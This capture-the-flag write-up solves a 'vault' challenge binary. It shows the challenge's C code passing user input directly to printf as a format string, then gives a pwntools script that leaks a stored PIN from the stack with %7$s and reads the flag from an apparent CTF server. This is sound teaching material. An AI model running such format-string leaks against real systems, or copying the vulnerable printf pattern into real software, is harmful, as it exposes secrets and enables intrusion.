# Vault Writeup

The vault program has options to **Open Vault** and **Read flag**, but accessing it requires the correct PIN.

```bash
$ ./vault    

--- Vault Menu ---
1. Open Vault
2. Add Item
3. Remove Item
4. List Items
5. Read flag
6. Exit
Enter your choice: 1
Enter your PIN to access the vault: fdsfds
the pin fdsfds is not correct

```


The program checks the PIN, and if it matches, grants access. If the PIN is incorrect, an error message displays the incorrect PIN. The error message passes our input to `printf` without proper formatting, which leads to a format string vulnerability.
```c
accessGranted = checkPIN(pin);
if (accessGranted) {
    printf("Vault opened successfully.\n");
} 
...
if (accessGranted) readFlag();
else printf("Please open the vault first.\n");
```

```c
bool checkPIN(char * pin) {

    char enteredPIN[PIN_LENGTH];
    printf("Enter your PIN to access the vault: ");
    fgets(enteredPIN, PIN_LENGTH, stdin);
    enteredPIN[strcspn(enteredPIN, "\n")] = '\0';  

    if (strcmp(pin, enteredPIN) == 0) {
        return true;
    }
    char output[100];
    sprintf(output, "the pin %s is not correct",enteredPIN );
    printf(output);
    return false;
}
```


To solve we can find the format string offset to where the pin is stored on the stack in order to leak it. I use a loop in python using `%<n>$s` to locate the PIN at index 7 by catching crashes on invalid addresses. With the PIN position known, we leak it to access the vault and read the flag.

```py
# Loop to find the offset of the pin
for i in range(10):
    try: 
        p = start()
        payload = f"%{i}$s".encode()
        p.clean()
        p.sendline(b"1")
        p.clean()
        p.sendline(payload)

        p.recvuntil("the pin ")
        leak = p.recvuntil(b" is", drop=True)

        print(f"{i}: {leak}")
    except:
        p.close()   
        pass
exit(0)
```


**Full solve script**
```py
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'vault')
host = args.HOST or 'fessemisk-845c-vault.ept.gg'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    p = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *checkPIN+0x7D
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

# Find the offset of the pin
# for i in range(10):
#     try: 
#         p = start()
#         payload = f"%{i}$s".encode()
#         p.clean()
#         p.sendline(b"1")
#         p.clean()
#         p.sendline(payload)

#         p.recvuntil("the pin ")
#         leak = p.recvuntil(b" is", drop=True)

#         print(f"{i}: {leak}")
#     except:
#         p.close()   
#         pass
# exit(0)

p = start()

# leak pin
p.clean()
p.sendline(b"1")
p.clean()
p.sendline(b"%7$s")

p.recvuntil("the pin ")
pin = p.recvuntil(b" is", drop=True)


# read flag 
p.clean()
p.sendline(b"1")
p.clean()
p.sendline(pin)
p.clean()
p.sendline(b"5")
p.clean()


p.interactive()
```